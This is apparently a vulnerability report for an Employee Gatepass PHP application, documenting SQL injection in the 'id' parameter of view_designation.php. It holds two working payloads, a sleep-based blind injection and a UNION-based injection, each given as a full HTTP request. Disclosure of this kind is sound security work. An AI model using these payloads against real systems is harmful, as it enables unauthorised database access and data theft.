BUG_Author: ZongXinLi

Vulnerability File: /employee_gatepass/admin/maintenance/view_designation.php

GET parameter 'id' exists SQL injection vulnerability

Payload1:id=1' and (select 2 from (select(sleep(10)))x) and 'x'='x

```
GET /employee_gatepass/admin/maintenance/view_designation.php?id=1%27%20and%20(select%202%20from%20(select(sleep(10)))x)%20and%20%27x%27=%27x HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: revenue[LastUrl]=%2Frates%2Fadmin%2Fsystem_settingslist.php; PHPSESSID=m9am97ggdd683nbbhr07jedt25
Connection: close
```

The server's response time is 10 seconds

![image](https://github.com/4O4NtFd/bug_report/blob/main/sql1.png)

Payload2:id=-1' union all select null,concat(0x35363738,0x65666768),null,null,null,null-- -

```
GET /employee_gatepass/admin/maintenance/view_designation.php?id=-1%27%20union%20all%20select%20null,concat(0x35363738,0x65666768),null,null,null,null--%20- HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: revenue[LastUrl]=%2Frates%2Fadmin%2Fsystem_settingslist.php; PHPSESSID=m9am97ggdd683nbbhr07jedt25
Connection: close
```

union query success

![image](https://github.com/4O4NtFd/bug_report/blob/main/sql2.png)
